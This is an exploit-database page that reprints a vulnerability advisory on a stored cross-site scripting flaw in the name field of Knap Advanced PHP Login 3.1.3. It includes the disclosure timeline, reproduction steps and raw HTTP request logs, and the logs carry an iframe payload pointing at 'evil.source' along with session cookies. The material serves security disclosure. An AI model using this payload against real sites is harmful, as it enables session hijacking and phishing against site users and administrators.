---
title: Knap Advanced PHP Login 3.1.3 Cross Site Scripting exploit
url: https://sploitus.com/exploit?id=PACKETSTORM:168712&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2022-10-18
fetch_date: 2025-10-03T20:04:11.018240
---

# Knap Advanced PHP Login 3.1.3 Cross Site Scripting exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# Exploit for Knap Advanced PHP Login 3.1.3 Cross Site Scripting

2022-10-17 | CVSS 0.1

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=PACKETSTORM:168712
Document Title:
===============
Knap (APL) v3.1.3 - Persistent Cross Site Vulnerability

References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2307

Release Date:
=============
2022-10-10

Vulnerability Laboratory ID (VL-ID):
====================================
2307

Common Vulnerability Scoring System:
====================================
5.7

Vulnerability Class:
====================
Cross Site Scripting - Persistent

Current Estimated Price:
========================
500€ - 1.000€

Product & Service Introduction:
===============================
Knap is an advanced User Management software written in Laravel 5.4 (PHP Framework) that allows the admin to manage users.

Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a persistent cross site web vulnerability in the Knap Advanced PHP Login v3.1.3 user management web-application.

Affected Product(s):
====================
ajay138
Product: Knap Advanced PHP Login v3.1.3 - User Management (Web-Application)

Vulnerability Disclosure Timeline:
==================================
2021-09-03: Researcher Notification & Coordination (Security Researcher)
2021-09-04: Vendor Notification (Security Department)
2022-**-**: Vendor Response/Feedback (Security Department)
2022-**-**: Vendor Fix/Patch (Service Developer Team)
2022-**-**: Security Acknowledgements (Security Department)
2022-10-10: Public Disclosure (Vulnerability Laboratory)

Discovery Status:
=================
Published

Exploitation Technique:
=======================
Remote

Severity Level:
===============
Medium

Authentication Type:
====================
Restricted Authentication (User Privileges)

User Interaction:
=================
Low User Interaction

Disclosure Type:
================
Responsible Disclosure

Technical Details & Description:
================================
A persistent input validation web vulnerability has been discoveredin the Knap Advanced PHP Login v3.1.3 user management web-application.
The vulnerability allows remote attackers to inject own malicious script codes with persistent attack vector to compromise browser to web-application
requests from the application-side.

The persistent cross site web vulnerability is located in the name parameter of the Profile Account - Account Information module.
Remote attackers with ow privileged user accounts are able to inject own malicious script code as name to provoke an execution
of the malicious content inside the users and activity log backend modules. The request method to inject is post. The injection
points are the user create or update and the execution of the maliciou script code occurs in the activity log and users listings.

Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, persistent external redirects
to malicious source and persistent manipulation of affected application modules.

Request Method(s):
[+] POST

Vulnerable Module(s):
[+] Register (Site)
[+] Update (Account Information)

Vulnerable Input(s):
[+] Name

Vulnerable Parameter(s):
[+] name

Affected Module(s):
[+] ./users
[+] ./activity

Proof of Concept (PoC):
=======================
The persistent input validation web vulnerability can be exploited by remote attackers with low privileged user account and low user interaction.
For security demonstration or to reproduce the persistent cross site web vulnerability follow the provided information and steps below to continue.

Manual steps to reproduce the vulnerability ...
1. Register as user or get registered by the admin
2. Start your web browser and a session tamper or debug tools
3. Open the My Profile menu with the Profile Account information section
4. Change the name input to your script code test payload and save via submit (post)
Note: The injected payload executes successfully in the users list (backend) and within the activity log on history (backend) on preview by admins or mods
5. Successful reproduce of the persistent cross site scripting web vulnerability!

--- PoC Session Logs (POST [Inject via User Role by Profile Account Update|Create] ---
https://knap.froid.works/profiles/102
Host: knap.froid.works
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------73425417436906186553080920069
Content-Length: 29455
Origin:https://knap.froid.works
Connection: keep-alive
Referer:https://knap.froid.works/profile-edit
Cookie: laravel_session=eyJpdiI6Ikt4Zmd3WDVSeThObVlvbnZld1JadWc9PSIsInZhbHVlIjoiN3pubk1YaVwvaWp6aWF2QlNwb3l2T2
h5MzdHZjJUd0Y2em1mUXE4Q1wvZHhnbkhwUW1ZaDU3aytaWFNURk5pc1M4IiwibWFjIjoiM2UwMTg0MGQ0M2VjMDk0YTVkN2M0ZGVjOWM5NmI1NDMzYzUxODU5ZmVkNmNmZDJlMTc5ZmVlYThiNTlkODIxZCJ9
0=_&1=t&2=o&3=k&4=e&5=n&6==&7=S&8=B&9=0&10=q&11=T&12=5&13=b&14=O&15=B&16=k&17=R&18=w&19=d&20=n&21=U&22=J&23=M&24=A&25=z&26=g&27=B
&28=e&29=8&30=T&31=X&32=0&33=F&34=q&35=v&36=N&37=L&38=b&39=J&40=I&41=j&42=M&43=k&44=1&45=B&46=z&47=&&48=_&49=m&50=e&51=t&52=h
&53=o&54=d&55==&56=P&57=U&58=T&59=&&60=n&61=a&62=m&63=e&64==&65=P&66=i&67=p&68=p&69=o&70=%&71=2&72=2&73=%&74=3&75=E&76=%&77=3
&78=C&79=i&80=m&81=g&82=%&83=3&84=E&85=%&86=3&87=E&88=%&89=2&90=2&91=%&92=3&93=C&94=i&95=f&96=r&97=a&98=m&99=e&100=+&101=s
&102=r&103=c&104=%&105=3&106=D&107=e&108=v&109=i&110=l&111=.&112=s&113=o&114=u&115=r&116=c&117=e&118=+&119=o&120=n&121=l&122=o
&123=a&124=d&125=%&126=3&127=D&128=a&129=l&130=e&131=r&132=t&133=(&134='&135=P&136=W&137=N&138=D&139='&140=)&141=%&142=3
&143=E&144=%&145=3&146=C&147=%&148=2&149=F&150=i&151=f&152=r&153=a&154=m&155=e&156=%&157=3&158=E&159=&&160=t&161=y&162=p&163=e&164==&165=p&166=e&167=r&168=s&169=o&170=n&171=a&172=l&173=I&174=n&175=f&176=o
&177=&&178=e&179=m&180=a&181=i&182=l&183==&184=f&185=t&186=p&187=%&188=4&189=0&190=l&191=i&192=v&193=e&194=.&195=c&196=o
&197=m&198=&&199=d&200=o&201=b&202==&203=2&204=0&205=2&206=1&207=-&208=0&209=9&210=-&211=1&212=0&213=&&214=g&215=e&216=n&217=d&218=e&219=r&220==&221=m&222=a&223=l&224=e&225=&&226=c&227=u&228=s&229=t&230=o
&231=m&232=_&233=f&234=i&235=e&236=l&237=d&238=s&239=_&240=d&241=a&242=t&243=a&244=%&245=5&246=B&247=u&248=r&249=b&250=_
&251=1&252=%&253=5&254=D&255==&256=t&257=e&258=s
&259=t&260=e&_token=SB0qT5bOBkRwdnUJMAzgBe8TX0FqvNLbJIjMk1Bz&_method=PUT&name=Pippo"><img>>"<iframe src=evil.source onload=alert('PWND')></iframe>&type=personalInfo
&email=ftp@live.com&dob=2021-09-10&gender=male&custom_fields_data[urb_1]=teste
-
POST: HTTP/1.1 200 OK
Server: Apache/2.4.39 (Ubuntu)
Set-Cookie:
laravel_session=eyJpdiI6Ik1zbUliRHJrMjNqY2pPcDQ5aENtYVE9PSIsInZhbHVlIjoiRjVYTG9aNjJUTlwvbHJDZ2xQbUx6V1hTOFg2SnlWeTBDYW1HVHNVOEJ4bUR
KZ3ExMFVRcEE0bEI5OURMUm55RVciLCJtYWMiOiIzMzg2OTAyZTcyMDJmOGQ0ZWY5MWNjY2ZkZmRkOTA3NzA2NjI1NzViOWM5OWVlMzE0ZTZjMzhjMjRjMjE0N2VhIn0%3D;
expires=Fri, 10-Sep-2021 19:09:50 GMT; Max-Age=7200; path=/; httponly
Content-Length: 53
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: application/json

--- PoC Session Logs (POST [Inject via Admin Role] ---
https://knap.froid.works/users/102
Host: knap.froid.works
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------23081715668612801831491484963
Content-Length: 39263
Origin:https://knap.froid.works
Connection: keep-alive
Referer:https://knap.froid.works/users
Cookie: laravel_session=eyJpdiI6IktJUUlXU21TZHZGRHdkNEczbGZwMXc9PSIsInZhbHVlIjoidlhcLzl3cU1UbHVwZFVDclhkXC9CZGdDNkh
XTEtlTnNmNWlWY3hwRzd3ZFNUcVI3R1plVHc1NE5tRUJoVmxobElQIiwibWFjIjoiODYyMmNiMjFlYTJjYzdkNGZkOTI2ZWQzYjg2M2U5OTA5NWI5NzVhYzExOWYzYTcwMTkyOTk1ZDMxOGRhNWE3OSJ9
0=_&1=t&2=o&3=k&4=e&5=n&6==&7=S&8=B&9=0&10=q&11=T&12=5&...